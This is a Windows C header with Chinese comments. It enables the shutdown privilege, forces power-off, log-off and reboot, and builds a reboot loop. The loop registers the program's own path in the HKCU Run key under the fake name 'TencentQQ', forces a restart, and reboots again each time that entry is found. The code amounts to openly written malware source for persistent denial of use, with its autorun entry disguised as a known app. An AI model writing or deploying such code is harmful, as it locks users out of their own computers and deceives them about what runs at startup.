#pragma once

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <tchar.h>
#include <Windows.h>

// 注册表地址
LPCWSTR regAddress = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

// 应用名称
LPCWSTR appName = _T("TencentQQ");

bool improvePrivilege() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	// 打开当前进程的权限令牌
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
		return false;
	}

	// 获取权限的权限标识LUID， 保存在tkp中
	// 第1个参数：NULL 表示要查看的是当前本地系统
	// 第2个参数：指定特权名称
	// 第3个参数：用来接收返回特权名称信息
	if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
		return false;
	}

	// 设置特权数组的个数
	tkp.PrivilegeCount = 1;

	// 启动特权
	// SE_PRIVILEGE_ENABLE_BY_DEFAULT 特权默认启动
	// SE_PRIVILEGE_ENABLED			  特权启动
	// SE_PRIVILEGE_USER_FOR_ACCESS   用来访问一个对象或者服务
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// 调用AdjustTokenPrivileges来提权
	// 修改令牌权限
	// 第1个参数：调整特权句柄
	// 第2个参数：禁止所有权限
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, NULL, NULL, NULL)) {
		return false;
	}
	return true;
}

bool powerOffProc() {
	if (!improvePrivilege() || !ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION)) {
		return false;
	}
	return true;
}

bool logOffProc() {
	if (!improvePrivilege() || !ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION)) {
		return false;
	}
	return true;
}

bool reBootProc() {
	if (!improvePrivilege() || !ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION)) {
		return false;
	}
	return true;
}

bool infiniteReBootProc() {

	// 注册表句柄
	HKEY hKey;

	// 提权
	if (!improvePrivilege()) {
		return false;
	}

	// 打开注册表
	if (0 != RegOpenKeyEx(HKEY_CURRENT_USER, regAddress, 0, KEY_ALL_ACCESS, &hKey)) {
		return false;
	}

	// 获取自己的路径
	TCHAR szData[260];
	GetModuleFileName(NULL, szData, 260);

	// 写注册表
	RegSetValueEx(hKey, appName, 0, REG_SZ, (BYTE*)szData, 260);

	// 关闭注册表
	RegCloseKey(hKey);

	// 重启
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
	
}

// 是否重启
void isReBootProc() {

	// 提权
	if (!improvePrivilege()) {
		return;
	}

	// 注册表句柄
	HKEY hKey;

	// 打开注册表
	if (0 != RegOpenKeyEx(HKEY_CURRENT_USER, regAddress, 0, KEY_ALL_ACCESS, &hKey)) {
		return;
	}

	// 查询注册表
	if (ERROR_SUCCESS == RegQueryValueEx(hKey, appName, 0, NULL, NULL, NULL)) {
		printf("存在\n");
		reBootProc();
	}
	else
	{
		printf("不存在\n");
	}

	// 关闭注册表
	RegCloseKey(hKey);
	return;
}